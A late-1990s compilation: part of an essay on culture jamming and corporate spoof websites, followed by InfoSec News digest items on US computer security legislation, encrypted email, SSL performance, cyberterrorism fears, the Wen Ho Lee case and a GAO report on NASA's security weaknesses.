              rewarding. I make over $74,000 a year. My wife still can't believe it.
              Please, please, please vote for me. I'll get you a job. I promise. 

         Agencies such as Tao "organize networks in order to defend and expand public
         space and the right to self-determination. (They) create knowledge through
         independent public interest research, and distribute it freely through participatory
         education." Other sites advise and promote subversive activities. The network is
         well entrenched and it's growing; there seems to be no interrupting the flow of
         communication.

         Online activism also enable people to shelter themselves from the mainstream
         culture. One recent tactic is called junk busting, which involves using proxy
         software to filter banners, cookies, and mask HTTP header data. A similar initiative
         attacks Intel and especially Intel's PSN (Processor Serial Number). And the fictional
         identity of Luther Bissett - complete with web site and email address - has been
         offered to the community at large for "communication guerrilla actions, hacktivism,
         civil disobedience (electronic and not) and radical mythopoesis."

         11. Web Ad Jamming and Spoof Sites

         A wide array of anti-advertsing sites, home page spoofs, and more express more
         clearly than any words the sentiments of the anti-meme movement.

         Spoof sites have probably existed since the advent of the World Wide Web, but in
         recent months their profile - and the litigation against them - has increased. The
         dean of corporate spoof sites is probably «TMark (pronounced 'Art Mark'). Originally
         an secretive and underground agency, «TMark has entered the public arena.

         «TMark is the behind the scenes broker of anti-meme mayhem. Projects are
         suggested by readers and staff, anonymous donors line up to fund different
         projects, and teams of activists carry out the plan. «TMark prenks have included
         switching the voice boxes in G.I. Joe and Barbie dolls, inserting homosexual
         couples in Sim Copter Graphics, and online, a scathing spoof site for Shell Oil, and
         most recently, a lavish G.W. Bush parody site.

         Corporate sites in general are ripe for spoof and parody. Happyclown, Inc. is 

              an exciting firm devoted to using a fresh and new approach to
              Corporate Communications; This young, modern and progressive
              Public Relations venture will make the aesthetic sensibilities of the New
              Generation available for the use of the familiar and trusted institutions of
              the Old Generation. 

         It is also several other things....

         Hole City presents the reader with a sideways
         look at media moguls.

              "It's a tremendous angle," says
              Rupert Murdoch, the media magnate
              whose fiery alliance with Satan has
              brought him fame, fortune and the Los
              Angeles Dodgers. "Our demographics
              indicate that Americans respond
              positively 53% of the time when we tell
              them the truth." 

         Other anti-corporate sites include Critical Mess Media (CMM), Mess Media's
         DisConnection (DisCo), and ZNet Anarchy Watch.

         A variation on this theme includes what the Culture Jammer's Enclyclopedia calls
         News Trolls: 

              If there's one thing that the left and the right can agree on, it's that the
              news is inaccurate, biased, and is more likely to cement popular
              prejudice than to uncover uncomfortable truths. So there's a certain
              satisfaction in deliberately planting absurd fiction among all the news
              that's fit. 

         Examples of fiction include the Arm the Homeless campaign, a computer that can
         replace judges, and the phoney Detroit gang incident.

         In Canada, underground tactics are employed by the Gurilla media - "media
         monkeywrenching for British Columbia, Canada" - purveyors of the National Post
         parody site and the Conrad Black Envy page: 

              Finally! A website for all of us who are profoundly envious of the
              Blacks-- Conrad and Barbara-- commanders-in-chief of the world's
              fastest growing press empire. This site is but a humble attempt to
              celebrate the Blacks' words and world: their unpretentious persiflage,
              personal pecuniary plentitude, pertinacious pedantry, proprietorial
              parsimony, perspicacious pomposity, and polymorphous periphrastic
              preeminence. 

         These and more patently false news sites cause some people to warn that "you
         can't trust everything you read on the internet". But their subversion is deeper -
         they inform the public that "you can't trust everything you read". No wonder news
         agencies and academics want to create "authoritative" web news sources.

         Another popular tactic reacts to the increasing commericalization of the web. A
         number of sites are creating and propogating spoof web ads. Such ads are meme
         hacking at its best - they lay generally ignored (check the top of this page) silently
         spreading subversion. 

         Spoof web ads are available on Positive Propaganda's unsorted banner page, from
         Chickenhead, Stay Free! Magazine, Abrupt's Holy War Now by 'Tony Alamo', and
         The Corporation's twisted children's companion, Cyberbear.
 

                                    Hacking Memes 



         12. The Anti-Meme

         The anti-meme is probably typified by the Kitty Porn site. The idea is to take an
         existing meme, alter it, and thus show its unreasonable or arbitrary nature. This is
         not a new idea - it was practised to great effect by the German philosopher
         Friedrich Nietzsche ("the transvaluation of value"). But online, such anti-memes
         are able for the first time to gain wide currency.

         Consider the spoof Alien Visitors Information Centre.
         This travelogue site makes fun of
         Chamber-of-Commerce inspired tourist brochures. But
         there is a deeper transvaluation:

              Kurt Waldheim is one of the large, hairy, upright-walking beasts selected
              as their leader though the recent United Nations model for better
              campground management. As U.N. secretary-general, Waldheim's
              personal greetings were launched in Voyagers 1 and 2, travelling AVIC
              kiosks in space which also carry the sounds of chimpanzees
              screeching. When we made those decisions, the management did not
              know Mr. Waldheim helped murder thousands of fellow humans during
              something significant called World War II. The employees who were
              responsible have been sacked. 

         The AVIC makes the very simple point that our contemporary culture is still capable
         of electing mass-murderers as world leaders, a fact verified by the many ongoing
         conflicts and genocides today.

         The anti-meme highlights the absurdity and even the moral decay of the
         mass-media meme: 

              Our society spends a lot of time telling us that there is some brand new,
              fresh cultural produce, generated from thin air and sunshine, slick and
              clean. They package it with pretty plastic & ribbons and then feed it to
              us. A lot gets thrown away: the ribbons, the wrapping; culture becomes
              garbage, or it dies, and rots behind the refrigerator. But the new fluffy
              shiny stuff still gets churned out, and it gets forced between our teeth.
              And we are told to swallow it. 

              We will not swallow. We will chew, and then spit. We will play with our
              food, and create something new and interesting from it. 

         This is similar to the Adbusters "Is Economic Progress Killing Our planet"
         campaign, and a host of other messages pointing to the waste and absurdity of the
         economic order as it exists today.

         The idea is to show that the sanitary culture presented in mass culture isn't the
         sanitary and stain-free entity the messages proclaim it to be. "The possibility of
         adding pimples to the retouched photo of the face on the cover of America are only
         now being seen as artistic territory." The anti-message is very simple: this is not
         good.

         Corporate and cultural abuses are legion, from the Exxon Valdiz oil spill to the
         Union Carbide poisoning of tens of thousands of people in Bhopal, India. Yet
         criticism is mute. As the Overcoming Consumerism site observes, 

              The often asked question, "why doesn't the media talk about corporate
              power?" and the frequent answer "because the corporations own the
              media...", really is a simplification of a wide-ranging process of
              power-sharing and wealth-retention that goes more to the kinds of
              people behind the corporations than the actual corporations themself. 

         The anti-meme is an attack not only on corporate and government policies and
         practises, but also on the media messages themselves. Hence, for example, we see
         sites such as White Dot, which ask, "What do you do if you don't watch TV?"

      House panel aims to bolster security law
      
      
      (Federal Computer Week) [5.20.99] WASHINGTON, D.C. -- The House Science
      Committee plans to make another push to update a 1989 law that requires
      civilian agencies to take measures to protect their computer systems,
      according to Rep. Constance Morella (R-Md.), chairwoman of the Technology
      Subcommittee of the House Science Committee. 
      
      
      The new bill, which could be introduced as early as next week, would
      revamp the 10-year-old Computer Security Act.  The bill will closely
      resemble the Computer Security Enhancement Act of 1997, which the House
      passed only to have it die in the Senate last year, said Morella, speaking
      at a symposium sponsored by the SmartCard Forum.
      Like the 1997 bill, the proposed legislation would tap the National
      Institute of Standards and Technology as the lead agency for information
      security. The preceding bill also would have required NIST to promote
      federal use of commercial off-the-shelf products for civilian security
      needs.
      
      
      The committee first began its effort to revamp the existing law to reflect
      the proliferation of network technology that has left agency data more
      vulnerable to corruption and theft, Morella said in 1997.

      NSA Taps Universities For Info Security Studies 
      
      
      The National Security Agency has designated seven U.S. universities as
      centers for information-security education, the agency said Tuesday. The
      NSA, a super-secret spy agency that wields broad power over U.S.
      encryption policy, named two private Virginia universities and a handful
      of state universities as Centers of Academic Excellence in Information
      Assurance Education. They are:  James Madison University, George Mason
      University, Idaho State University, Iowa State University, Purdue
      University, University of California at Davis, and the University of
      Idaho.The centers are expected to become "focal points for recruiting, and
      may create a climate to encourage independent research in information
      assurance," the NSA said.The agency said the decision to launch the
      information-assurance program represented an attempt to reach out and form
      partnerships with industry pursuant to a Clinton administration directive
      last year on critical infrastructure protection.The seven centers will be
      formally recognized during a conference on information-security systems
      scheduled for May 25 to 29 at IBM's conference facility in Palisades, N.Y.

 31.0 [ISN] HushMail: free Web-based email with bulletproof encryption

      1999-05-19:
      
      
      ..HushMail: free Web-based email with bulletproof encryption
      
      
      Hush Communications has quietly begun beta testing a significant
      development in email privacy. HushMail [1] works like Hotmail or
      Rocketmail -- you can set up multiple free accounts and access them from
      any Web browser anywhere -- but when you email another HushMail user your
      communication is protected by unbreakable encryption. The crypto,
      implemented in a downloadable Java applet, was developed outside of US
      borders and so has no export limitations. 
      
      
      Here are the FAQ [2] and a more technical overview [3] of the Hush- Mail
      system. 
      
      
      HushMail public and private keys are 1024 bits long, and are stored on a
      server located in Canada. All information sent between the HushApplet and
      the HushMail server is encrypted via the Blowfish symmetric 128-bit
      algorithm. The key to this symmetric pipe is randomly generated each
      session by the server and is transferred to the client machine over a
      secure SSL connection.
      
      
      When you sign on as a new user you can choose an anonymous account or an
      identifiable one. For the latter you have to fill out a demographic
      profile, to make you more attractive (in the aggregate) to HushMail's
      advertisers. The HushApplet walks you through generating a public-private
      key-pair. The process is fun and slick as a smelt.  You need to come up
      with a secure pass-phrase, and in this process HushMail gives only minimal
      guidance. You might want to visit Arnold Reinhold's Diceware page [4],
      where he lays out a foolproof pass- phrase protocol utilizing a pair of
      dice. 
      
      
      HushMail relies heavily on Java (JVM 1.1.5 or higher), so it can only be
      used with the latest browsers. The earliest workable version of Netscape's
      browser is 4.04, but some features don't work in versions before 4.07; the
      latest version, 4.5, is best. For Internet Explorer users, 4.5 is
      recommended, but the latest Windows release of IE 4.0 (subversion
      4.72.3110) works as well. Red Hat Linux version 5.2 is also tested and
      supported. Unfortunately, HushMail does not work on Macintoshes, due to
      limitations in Apple's Java implementation. (Mac users can crawl HushMail
      under Connectix Virtual PC. Note that I don't say "run." I've tried this
      interpretation-under-emulation and do not recommend it.) The company is
      trying urgently to connect with the right people at Apple to get this
      situation remedied. 
      
      
      One of the limitations of this early release of HushMail is that
      encryption can only be used to and from another HushMail account. It is
      not currently possible to export your public/private key-pair, to set up
      automatic forwarding of mail sent to a HushMail account, or to import
      non-Hush public keys. I spoke with Cliff Baltzley, Hush's CEO and chief
      technical wizard. He stresses that Hush's desire and intention is to move
      toward interoperability with other players in the crypto world, such as
      PGP and S/MIME. The obstacles to doing so are the constraints on technical
      resources (read: offshore crypto programmers) and legal questions of
      intellectual property. Baltzley believes that HushMail's positive impact
      on privacy worldwide will be enhanced by maximizing the product's
      openness.

 32.0 [ISN] E-Biz Bucks Lost Under SSL Strain

      E-Biz Bucks Lost Under SSL Strain
      By TIM WILSON 
      
      
      A customer stuffs his shopping cart with goodies from your Web site.
      Credit card in hand, he waits for a secure connection to consummate the
      deal. And waits. Finally, short of patience, he dumps the contents and
      logs off. 
      
      
      It may sound like an e-commerce manager's nightmare, but according to the
      latest Web server performance statistics, it's an increasingly common
      phenomenon. 
      
      
      The ghost in the machine is Secure Sockets Layer, the commonly used method
      of securing communications between users and Web sites. 
      
      
      Recent tests conducted by researcher Networkshop Inc. indicate that
      powerful Web servers capable of handling hundreds of transactions per
      second may be brought to a near standstill by heavy SSL traffic. Some
      server configurations suffered as much as a fiftyfold degradation in
      performance from SSL, down to just a few transactions per second,
      according to analyst Alistair Croll at Networkshop. 
      
      
      The growing problem of SSL performance has driven vendors to develop
      devices that can help share the Web server's processing load. IPivot Inc.
      next month will ship two new processors that can offload authentication
      and encryption on e-commerce sites. 
      
      
      IT managers and other experts have known for years that SSL, which
      requires the authentication and encryption of Web server connections, can
      significantly slow site performance. But the problem is rapidly becoming
      more chronic as companies increase secured Web transactions, they said. 
      
      
      "Our business is very seasonal, and a lot of it is concentrated in the
      fourth quarter. This past December, we found ourselves shuffling servers
      around to handle the load," said Stephen McCollum, network architect at
      Hewitt Associates. The $858 million company manages benefits plans for
      large organizations, and because Hewitt's Web traffic is personal and
      confidential, virtually all of it is conducted via SSL. 
      
      
      Hewitt is far from alone in its reliance on SSL. According to a study
      conducted by research company Netcraft Ltd., SSL implementations doubled
      from 15,000 sites to more than 35,000 sites between 1998 and 1999. And
      many of those server sites are struggling under the load. 
      
      
      "I'd guess that somewhere between 10 and 25 percent of [e-commerce]
      transactions are aborted because of slow response times," said Rodney
      Loges, vice president of business development at Digital Nation, a Web
      hosting company. 
      
      
      That translates to as much as $1.9 billion in lost revenue, using
      Forrester Research numbers for 1998 of $7.8 billion in e-retail sales. 
      
      
      According to Networkshop, even the most powerful, general-purpose Web
      server hardware can be dragged down by large volumes of SSL traffic. In
      its most recent tests, the research company found that a typical Pentium
      server configuration running Linux and Apache, which at full capacity can
      handle about 322 connections per second of standard HTTP traffic, fell to
      about 24 connections per second when handling a full load of SSL traffic. 
      
      
      A similar test conducted on a Sun 450 server running Solaris and Apache
      experienced even more trouble. The server handled about 500 connections
      per second of HTTP traffic at full capacity, but only about 3 connections
      per second when the traffic was secured via SSL. Networkshop tests of
      quad-processor configurations showed that those performance ratios scale
      to multiserver environments as well, Croll said. 
      
      
      A few vendors, such as Rainbow Technologies Inc., have solved the problem
      by offloading security processing onto a dedicated co-processor card that
      slips into a server. But as SSL traffic increases, adding and managing
      co-processor boards becomes unwieldy, IT managers said. "We found that the
      [co-processor] cards were kind of a kludge, because they have to be added
      to every server," said Digital Nation's Loges. 
      
      
      IPivot will begin shipping two external SSL processors--the Commerce
      Accelerator 1000 and the Commerce Director 8000, which includes IPivot's
      load-balancing system--to help eliminate SSL bottlenecks. 
      
      
      The Commerce Accelerator 1000 is priced at $9,995; the Commerce Director
      8000 costs $39,950.

      Bracing for guerrilla warfare in cyberspace
      'There are lots of opportunities; that's very scary'
      
      
      April 6, 1999
      By John Christensen
      CNN Interactive 
      
      
      (CNN) -- It is June, the children are out of school, and as highways and
      airports fill with vacationers, rolling power outages hit sections of Los
      Angeles, Chicago, Washington and New York. An airliner is mysteriously
      knocked off the flight control system and crashes in Kansas. 
      
      
      Parts of the 911 service in Washington fail, supervisors at the Department
      of Defense discover that their e-mail and telephone services are disrupted
      and officers aboard a U.S. Navy cruiser find that their computer systems
      have been attacked. 
      
      
      As incidents mount, the stock market drops precipitously, and panic surges
      through the population. 
      
      
      Unlikely? Hardly. The "electronic Pearl Harbor" that White House terrorism
      czar Richard A. Clarke fears is not just a threat, it has already
      happened. 
      
      
      Much of the scenario above -- except for the plane and stock market
      crashes and the panic -- occurred in 1997 when 35 hackers hired by the
      National Security Agency launched simulated attacks on the U.S. 
      electronic infrastructure. 
      
      
      "Eligible Receiver," as the exercise was called, achieved "root level" 
      access in 36 of the Department of Defense's 40,000 networks. The simulated
      attack also "turned off" sections of the U.S. power grid, "shut down"
      parts of the 911 network in Washington, D.C., and other cities and gained
      access to systems aboard a Navy cruiser at sea. 
      
      
      At a hearing in November 1997, Sen. Jon Kyl, R-Arizona, chairman of a
      Senate technology subcommittee, reported that nearly two-thirds of U.S. 
      government computers systems have security holes. 
      
      
      "If somebody wanted to launch an attack," says Fred B. Schneider, a
      professor of computer science at Cornell University, "it would not be at
      all difficult." 
      
      
      'There are lots of opportunities'
      
      
      Although "Eligible Receiver" took place in the United States, which has
      about 40 percent of the world's computers, the threat of cyberterrorism is
      global. 
      
      
      Consider: 
      
      
      * During the Gulf War, Dutch hackers stole information about U.S. troop
      movements from U.S. Defense Department computers and tried to sell it to
      the Iraqis, who thought it was a hoax and turned it down. 
      
      
      * In March 1997, a 15-year-old Croatian youth penetrated computers at a
      U.S. Air Force base in Guam. 
      
      
      * In 1997 and 1998, an Israeli youth calling himself "The Analyzer" 
      allegedly hacked into Pentagon computers with help from California
      teen-agers. Ehud Tenebaum, 20, was charged in Jerusalem in February 1999
      with conspiracy and harming computer systems. 
      
      
      * In February 1999, unidentified hackers seized control of a British
      military communication satellite and demanded money in return for control
      of the satellite. 
      
      
      The report was vehemently denied by the British military, which said all
      satellites were "where they should be and doing what they should be
      doing." Other knowledgable sources, including the Hacker News Network,
      called the hijacking highly unlikely. 
      
      
      "There are lots of opportunities," says Schneider.  "That's very scary." 
      
      
      'The Holy Grail of hackers'
      
      
      President Clinton announced in January 1999 a $1.46 billion initiative to
      deal with U.S. government computer security -- a 40 percent increase over
      fiscal 1998 spending. Of particular concern is the Pentagon, the military
      stronghold of the world's most powerful nation. 
      
      
      "It's the Holy Grail of hackers," says computer security expert Rob Clyde.
      "It's about bragging rights for individuals and people with weird
      agendas." 
      
      
      Clyde is vice president and general manager of technical security for
      Axent Technologies, a company headquartered in Rockville, Maryland, that
      counts the Pentagon as one of its customers. 
      
      
      The Defense Department acknowledges between 60 and 80 attacks a day,
      although there have been reports of far more than that. 
      
      
      The government says no top secret material has ever been accessed by these
      intruders, and that its most important information is not online.  But the
      frustration is evident. 
      
      
      Michael Vatis, director of the FBI's National Infrastructure Protection
      Committee, told a Senate subcommittee last year that tracing cyberattacks
      is like "tracking vapor." 
      
      
      'A lot of clueless people'
      
      
      Schneider says the "inherently vulnerable" nature of the electronic
      infrastructure makes counterterrorism measures even more difficult. 
      Schneider chaired a two-year study by the National Academy of Sciences and
      the National Academy of Engineering that found that the infrastructure is
      badly conceived and poorly secured. 
      
      
      "There is a saying that the amount of 'clue' [knowledge] on the Internet
      is constant, but the size of the Internet is growing exponentially," says
      Schneider. "In other words, there are a lot of clueless people out there.
      It's basically a situation where people don't know how to lock the door
      before walking out, so more and more machines are vulnerable." 
      
      
      Schneider says the telephone system is far more complicated than it used
      to be, with "a lot of nodes that are programmable, and databases that can
      be hacked." Also, deregulation of the telephone and power industries has
      created another weakness:  To stay competitive and cut costs, companies
      have reduced spare capacity, leaving them more vulnerable to outages and
      disruptions in service. 
      
      
      Still another flaw is the domination of the telecommunications system by
      phone companies and Internet service providers (ISPs) that don't trust
      each other. As a result, the systems do not mesh seamlessly and are
      vulnerable to failures and disruptions. 
      
      
      "There's no way to organize systems built on mutual suspicion,"  Schneider
      says.  "We're subtly changing the underpinnings of the system, but we're
      not changing the way they're built. We'll keep creating cracks until we
      understand that we need a different set of principles for the components
      to deal with each other." 
      
      
      'The democratization of hacking'
      
      
      Meanwhile, the tools of mayhem are readily available. 
      
      
      There are about 30,000 hacker-oriented sites on the Internet, bringing
      hacking -- and terrorism -- within the reach of even the technically
      challenged. 
      
      
      "You no longer have to have knowledge, you just have to have the time," 
      Clyde says. "You just download the tools and the programs. It's the
      democratization of hacking. And with these programs ... they can click on
      a button and send bombs to your network, and the systems will go down." 
      
      
      Schneider says another threat is posed not by countries or terrorists, but
      by gophers and squirrels and farmers. 
      
      
      In 1995, a New Jersey farmer yanked up a cable with his backhoe, knocking
      out 60 percent of the regional and long distance phone service in New York
      City and air traffic control functions in Boston, New York and Washington.
      In 1996, a rodent chewed through a cable in Palo Alto, California, and
      knocked Silicon Valley off the Internet for hours. 
      
      
      "Although the press plays up the security aspect of hacker problems," 
      says Schneider, "the other aspect is that the systems are just not built
      very reliably. It's easy for operators to make errors, and a gopher
      chewing on a wire can take out a large piece of the infrastructure. That's
      responsible for most outages today." 
      
      
      'The prudent approach'
      
      
      Schneider and Clyde favor a team of specialists similar to Clinton's
      proposed "Cyber Corps" program, which would train federal workers to
      handle and prevent computer crises. But they say many problems can be
      eliminated with simple measures. 
      
      
      These include "patches" for programs, using automated tools to check for
      security gaps and installing monitoring systems and firewalls.  Fixes are
      often free and available on the Internet, but many network administrators
      don't install them. 
      
      
      A step toward deterrence was taken in 1998 when CIA Director George Tenet
      announced that the United States was devising a computer program that
      could attack the infrastructure of other countries. 
      
      
      "That's nothing new," says Clyde, "but it's the first time it was publicly
      announced. If a country tries to destroy our infrastructure, we want to be
      able to do it back. It's the same approach we've taken with nuclear
      weapons, the prudent approach."

      Prosecuting Lee Is Problematic
      Physicist's Mishandling of Computer Data May Not Be Crime
      By Vernon Loeb and Walter Pincus
      Washington Post Staff Writers
      Monday, May 24, 1999; Page A05
      
      
      Espionage suspect Wen Ho Lee's transfer of top secret computer programs
      from a classified to a vulnerable computer network at Los Alamos National
      Laboratory has left federal prosecutors wrestling with the question of
      whether such mishandling of classified information in cyberspace
      constitutes a crime. 
      
      
      Lacking evidence of espionage, FBI agents have focused on Lee's
      unauthorized data transfer ever since they searched his desktop computer
      in March and discovered top secret "legacy codes" in a system that could
      have been accessed by hackers. 
      
      
      But there is no known prosecution of anyone for transferring classified
      data from classified to unclassified government computer systems, leaving
      prosecutors to fathom the frontiers of cybersecurity under espionage
      statutes that make no reference to computers, according to lawyers
      specializing in national security law and U.S. officials familiar with the
      case. 
      
      
      Lee, 59, a Taiwan-born nuclear physicist who is a U.S. citizen, was fired
      March 8 for alleged security violations at Los Alamos and identified by
      U.S. officials as an espionage suspect, despite their inability to charge
      him as a spy for China. Congress is investigating why the FBI and the
      Justice Department failed to search his office computer prior to his
      dismissal. 
      
      
      That slow response drew more criticism yesterday. The chairman of the
      Senate intelligence committee, Richard C. Shelby (R-Ala.), renewed his
      call for the ouster of Attorney General Janet Reno. Branding her handling
      of the case "indefensible," Shelby said on CBS's "Face the Nation" that
      "the attorney general ought to resign and she ought to take her top
      lieutenants with her." 
      
      
      On the same show, Sen. Robert G. Torricelli (D-N.J.) also criticized Reno,
      although he stopped short of advocating resignation: "It's time for
      President Clinton to have a conversation with the attorney general about
      her ability to perform her duties and whether or not it is in the national
      interest for her to continue." Torricelli said Reno had displayed
      "failures of judgment" that were "inexplicable." He singled out her
      decision not to approve a wire tap of Lee "despite overwhelming evidence
      that there was probable cause and that the national security was being
      compromised." 
      
      
      White House spokesman Barry Toiv said Clinton "has full confidence in
      Attorney General Reno," Reuters reported. 
      
      
      Lee has denied passing classified information to China and has said
      through his attorney he took "substantial steps" to safeguard the
      transferred computer codes. 
      
      
      A provision of the federal espionage statute makes the removal of
      classified defense information from its "proper place of custody" through
      "gross negligence" a felony punishable by up to 10 years in prison,
      according to lawyers specializing in national security cases. 
      
      
      But it is unclear whether Lee could be charged under that provision,
      absent intent on his part to make unlawful use of the data or evidence it
      was obtained by unauthorized individuals, they said. 
      
      
      "You've got a clear security breech," said former CIA inspector general
      Frederick Hitz. "But as far as a criminal prosecution . . . I would think
      that's going to be tough." 
      
      
      Another law makes the "unauthorized removal and retention of classified
      documents or material" at one's home a misdemeanor punishable by a maximum
      $1,000 fine and one-year prison sentence. The measure was enacted to
      safeguard classified materials against careless handling, not espionage. 
      
      
      Two former National Security Agency employees, a husband and wife, were
      the first to be prosecuted under the law last year, pleading guilty to
      having retained classified documents at their home after leaving
      government service. 
      
      
      But the lawyers specializing in national security cases say they do not
      believe the statute could be used against Lee, because he apparently did
      not remove the programs from government property. 
      
      
      They said in two recent cases involving computer transfers of classified
      information, one involving another Los Alamos scientist and the other,
      former CIA director John M. Deutch, the Justice Department declined
      prosecution. 
      
      
      The scientist at Los Alamos, who has not been publicly identified, moved
      classified nuclear weapons data last year from the laboratory's classified
      to its unclassified network in a transfer analogous to that performed by
      Lee. 
      
      
      But the transfer was ultimately determined to have been "inadvertent," 
      according to a senior Energy Department official. The FBI found no
      criminal intent and closed the case, the official said. 
      
      
      Deutch was investigated by the Justice Department for transferring more
      than 30 classified documents to his personal, unsecured laptop during his
      tenure as CIA director from May 1995 to December 1996. The security breach
      was discovered when CIA specialists went to his Washington home to remove
      a classified computer and safe and discovered the classified files on his
      personal computer. 
      
      
      Under CIA policy, Deutch's security violation was forwarded to Justice for
      review, but officials there declined prosecution. The case was recently
      recently returned to the CIA for review by Inspector General Britt Snider,
      who is expected to complete a report on the matter soon. 
      
      
      Deutch, who does government consulting and teaches at Massachusetts
      Institute of Technology, could have his security clearance lifted for a
      period of time, one government source said.

 35.0 [ISN] Slip of the Tongue Lightens up Encryption Hearing

      Slip of the Tongue Lightens up Encryption Hearing
      By JERI CLAUSING 
      
      
      WASHINGTON -¡ The Clinton Administration's point man on encryption policy
      silenced his Congressional critics ¡- momentarily, anyway -- with a slip
      of the tongue at a House hearing last week.
      
      
      "Never underestimate the stupidity of some of the people we have to deal
      with," William A. Reinsch, Under Secretary of Commerce for the Bureau of
      Export Administration, said while being grilled about whether terrorists
      and criminals would be na∩ve enough to use the technology being pushed by
      the Administration. 
      
      
      The House International Relations subcommittee meeting fell silent and
      Reinsch turned bright red as he realized the double meaning of what he had
      said. As the silence turned to laughter, Reinsch tried to backtrack,
      blurting, "I didn't say that." 
      
      
      But it was enough to silence Representative Bradley J. Sherman. Sherman
      promptly ended his grilling of Reinsch, who along with representatives of
      the National Security Agency and the Federal Bureau of Investigation, was
      testifying in defense of the Administration's encryption policy. The
      Administration has tied any loosening of export controls on strong
      encryption to the development of technology that would guarantee law
      enforcement easy access to criminals' communications.

      The primary audience described in the introduction seems to be security
      professionals.  However, system administrators, technology managers, and
      CIOs are mentioned as well.  The attempt at breadth of coverage usually
      does not bode well in works like these. 
      
      
      Chapter one discusses an information security model based upon the
      business (and other) objectives of the institution in question.  While
      valid as far as it goes, and even possibly helpful when formulating
      security policy, this by no means provides a structure from which to view
      either security policy or procedures, let alone implement a complex set of
      controls.  The widget company, beloved of management writers, is described
      in chapter two.  For the purposes of assessing security in real world
      working environments, this particular widget company seems to be
      astoundingly simple and homogeneous. 
      
      
      Chapter three starts out talking reasonably about security policy, starts
      to get flaky in risk assessment (I would definitely worry about a .45
      chance of an earthquake), and tails off into trivia. Monitoring, in
      chapter four, looks first at system performance and diagnostics, and then
      gets into event logging without really going into the concepts.  Many
      areas of physical security are left uncovered in chapter five.  Chapter
      six discusses domains, trust relationships, and remote access permissions. 
      Dialogue boxes for user accounts and groups are listed in chapter seven. 
      There is some mention of the commonly "received wisdom" in regard to these
      topics, as there is in chapter eight regarding account policies, but
      nothing very significant.  File system, share, and other resource control
      is covered in chapter nine.  Chapter ten is a bit of a grab bag without
      much focus.  The registry is reviewed in chapter eleven.  Chapter twelve
      looks briefly at power supplies and backups.  Although it talks about
      auditing, chapter thirteen is more of a checklist of security features to
      think about.  Appendix A is a bit better in this regard:  it lists
      recommended settings across a number of functions for six different types
      of systems. 
      
      
      There is some discussion of options as the various functions are
      addressed, so, in a sense, this is a start towards full coverage of NT
      security.  It has a long way to go, though.  In addition, the deliberation
      comes at the cost of a loss of some detail in terms of security
      implementation.

      LCI Intros SMARTpen Biometric Signature Authentication
      
      
      S'HERTGENBOSCH, NETHERLANDS, 1999 MAY 24 (NB)
      By Sylvia Dennis, Newsbytes.
           
      LCI Technology has taken the wraps off its SMARTpen biometric signature
      authentication system. The SMARTpen is billed as the world's first
      wireless signature device and the only biometric unit of its type that
      writes on normal paper.Sam Asseer, the firm's chairman, said that the unit
      was designed for high-end security transactions. It is, he explained, a
      wireless embedded computer system that looks and writes like a common
      ballpoint pen. 
           
      In use, the SMARTpen uses built-in sensors that enable the authentication
      of users through the biometric characteristics of their signatures on
      regular paper. 
           
      "Electronic commerce is rapidly becoming the way the world does business,"
      he said, adding that the surge in online transactions over the past two
      years and the predictions for explosive growth going into the year 2000
      suggests that the future of e-commerce is unlimited. 
           
      "But, as the number of Internet transactions increases, there is an even
      greater demand for security to ensure confidentiality and prevent fraud.
      Biometric authentication systems like the LCI SMARTpen help create the
      secure environment necessary for the continued expansion of global
      e-commerce," he said. 
           
      According to the firm, the SMARTpen measures individual signature
      characteristics, encrypts the data and transmits it via radio frequency to
      a computer, where LCI software compares it to a template for verification
      - all in about three seconds. 
           
      The firm claims that the dynamics of signatures as measured by the
      SMARTpen are personal and not directly visible from the written image. 
           
      This, the firm says, makes it virtually impossible for forged signatures
      to get through the SMARTpen system. The system works with standard APIs
      (application programming interfaces) and the false rejection/false
      acceptance rate can be adjusted by system parameters, so adding
      flexibility. 
           
      Pricing on the SMARTpen is expected to range from $100 to $250, depending
      on the model and configuration of the product. 
           
      According to LCI, the price includes the pen and software components.  The
      SMARTpen also has integral sensors, a mouse, a digital signal processor,
      radio transmitter and receiver, and encryption system.

      There will be tutorial-style presentations during October 4 and 5.
      October 6, 7 and 8 will consist of conference papers and workshop-style 
      presentations, as well as business sessions.
      
      
      Two evenings are allocated for participants to hold events devoted to
      subjects of particular interest ("birds of a feather" sessions).
      
      
      Contributions should follow the following guidelines:
      
      
      1. Tutorials:      Half or full day tutorial proposals will be
                considered.
      2. Papers:         Written papers may be as long as desired, but
                         presentations must be limited to 30 minutes.
      3. Workshops:      These informal sessions should either follow a more
                         "hands-on" approach or provide for a high degree of
                         audience participation. They should be tailored to
                         address specific issues and should be from 60 to 90
                minutes in duration. Panel Sessions on a particular 
                topic are also acceptable.

 39.0 [ISN] GAO: NASA systems full of holes.

      MAY 24, 1999 
      GAO: NASA systems full of holes 
      BY DIANE FRANK (diane_frank@fcw.com)
      
      
      Out-of-date information security policies have left significant
      vulnerabilities in NASA's mission-critical systems that could allow
      unauthorized users to steal, modify or delete important operational data,
      according to a General Accounting Office report released last week. 
      
      
      GAO, working over the past year with experts from the National Security
      Agency and using nothing more than public Internet access, was able to
      gain access to several unclassified mission-critical systems, including
      those supporting the command and control of spacecraft.
      
      
      According to GAO, NASA has not created enough awareness among its
      employees about common security mistakes and vulnerabilities, such as
      easily guessed passwords. NSA initially breached some systems using
      passwords such as "guest" for guest accounts and "adm" for system
      administrators, opening the door for broader access to agency systems.
      
      
      "The way we got in was through commonly known security faults," said John
      de Ferrari, assistant director of the Accounting and Information
      Management Division at GAO.
      
      
      GAO concluded that it was able to penetrate systems because NASA does not
      have a consistent information security management policy that the entire
      agency follows. "A lot of what needs to be done is awareness-related; you
      never seem to get enough awareness of computer security," de Ferrari said.
      
      
      GAO found that NASA did not have many policies regarding Internet and
      network security, and some policies the agency did have were out of date
      or were not followed. 
      
      
      "We Had Become Quite Lax"  "The fact of the matter is, we had become quite
      lax in the agency in terms of passwords," said Lee Holcomb, NASA's chief
      information officer. NASA now is scanning user passwords for ones that
      could be easily cracked and to check new passwords for vulnerabilities.
      
      
      "We take very seriously our responsibility for safeguarding our IT assets,
      and after Y2K, security is our No. 1 priority," Holcomb said. "They
      acknowledge that they did not succeed in penetrating several systems, but
      the fact that they did succeed is troubling to us. It is a wake-up call to
      the agency."
      
      
      This report is an important addition to the work already occurring
      throughout government to raise awareness of security needs, said Paul
      Rodgers, senior executive at the Critical Infrastructure Assurance Office,
      which is leading the national effort to protect critical systems. "The
      dangers are increasing, and we think the GAO report delivers an important
      message to NASA and other agencies," Rodgers said.
      
      
      The GAO/NSA team could not penetrate certain pockets of NASA's systems
